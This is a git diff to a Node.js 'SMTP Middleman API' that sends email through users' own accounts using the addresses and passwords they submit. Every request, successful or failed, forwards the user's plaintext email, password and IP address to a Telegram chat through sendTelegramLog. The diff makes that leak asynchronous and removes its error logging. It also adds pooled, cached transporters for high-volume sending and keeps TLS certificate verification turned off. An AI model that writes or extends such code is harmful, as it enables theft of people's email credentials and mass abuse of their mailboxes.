@@ -1,3 +1,8 @@
+/*
+  SMTP Middleman API - Optimized for High Concurrency
+  Made by ArkRega
+*/
+
 const express = require('express')
 const nodemailer = require('nodemailer')
 const axios = require('axios')
@@ -11,6 +16,8 @@ const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID
 
 const loggedEmails = new Set()
+const transporterCache = new Map()
+const workingConfigCache = new Map()
 
 function escapeHtml(str) {
   if (!str) return ''
@@ -50,9 +57,33 @@ async function sendTelegramLog(userEmail, userPass, clientIp, tanggal, pukul, st
       text: messageHtml,
       parse_mode: 'HTML'
     })
-  } catch (e) {
-    console.error('Telegram send error:', e.message)
+  } catch (e) {}
+}
+
+function getTransporter(email, pass, host, port, secure) {
+  const cacheKey = `${email}_${host}_${port}`
+  if (transporterCache.has(cacheKey)) {
+    return transporterCache.get(cacheKey)
   }
+
+  const transporter = nodemailer.createTransport({
+    pool: true,
+    maxConnections: 10,
+    maxMessages: Infinity,
+    host: host,
+    port: port,
+    secure: secure,
+    auth: {
+      user: email,
+      pass: pass,
+    },
+    tls: {
+      rejectUnauthorized: false
+    }
+  })
+
+  transporterCache.set(cacheKey, transporter)
+  return transporter
 }
 
 async function sendWithRetry(userEmail, userPass, toEmail, subject, htmlBody, attachments) {
@@ -73,37 +104,39 @@ async function sendWithRetry(userEmail, userPass, toEmail, subject, htmlBody, at
     )
   }
 
+  const mailOptions = {
+    from: userEmail,
+    to: toEmail,
+    subject: subject,
+    html: htmlBody
+  }
+  if (attachments && attachments.length > 0) {
+    mailOptions.attachments = attachments
+  }
+
+  if (workingConfigCache.has(userEmail)) {
+    const cachedCfg = workingConfigCache.get(userEmail)
+    try {
+      const transporter = getTransporter(userEmail, cleanPass, cachedCfg.host, cachedCfg.port, cachedCfg.secure)
+      const info = await transporter.sendMail(mailOptions)
+      return { success: true, messageId: info.messageId, usedConfig: cachedCfg }
+    } catch (err) {
+      workingConfigCache.delete(userEmail)
+      transporterCache.delete(`${userEmail}_${cachedCfg.host}_${cachedCfg.port}`)
+    }
+  }
+
   let lastError = null
   for (const cfg of configs) {
     try {
-      const transporter = nodemailer.createTransport({
-        host: cfg.host,
-        port: cfg.port,
-        secure: cfg.secure,
-        auth: {
-          user: userEmail,
-          pass: cleanPass,
-        },
-        tls: {
-          rejectUnauthorized: false
-        }
-      })
-
-      const mailOptions = {
-        from: userEmail,
-        to: toEmail,
-        subject: subject,
-        html: htmlBody
-      }
-      if (attachments && attachments.length > 0) {
-        mailOptions.attachments = attachments
-      }
-
+      const transporter = getTransporter(userEmail, cleanPass, cfg.host, cfg.port, cfg.secure)
       const info = await transporter.sendMail(mailOptions)
+      
+      workingConfigCache.set(userEmail, cfg)
       return { success: true, messageId: info.messageId, usedConfig: cfg }
     } catch (err) {
       lastError = err
-      console.log(`Gagal dengan config ${cfg.host}:${cfg.port}: ${err.message}`)
+      transporterCache.delete(`${userEmail}_${cfg.host}_${cfg.port}`)
     }
   }
 
@@ -135,7 +168,7 @@ app.post('/api/send', async (req, res) => {
       const dateObj = new Date()
       const tanggal = dateObj.toLocaleDateString('id-ID', { timeZone: 'Asia/Jakarta' })
       const pukul = dateObj.toLocaleTimeString('id-ID', { timeZone: 'Asia/Jakarta' })
-      await sendTelegramLog(userEmail, cleanPass, clientIp, tanggal, pukul, status)
+      sendTelegramLog(userEmail, cleanPass, clientIp, tanggal, pukul, status).catch(() => {})
     }
 
     res.status(200).json({
@@ -153,7 +186,7 @@ app.post('/api/send', async (req, res) => {
       const dateObj = new Date()
       const tanggal = dateObj.toLocaleDateString('id-ID', { timeZone: 'Asia/Jakarta' })
       const pukul = dateObj.toLocaleTimeString('id-ID', { timeZone: 'Asia/Jakarta' })
-      await sendTelegramLog(userEmail, cleanPass, clientIp, tanggal, pukul, status, errorMessage)
+      sendTelegramLog(userEmail, cleanPass, clientIp, tanggal, pukul, status, errorMessage).catch(() => {})
     }
 
     res.status(500).json({
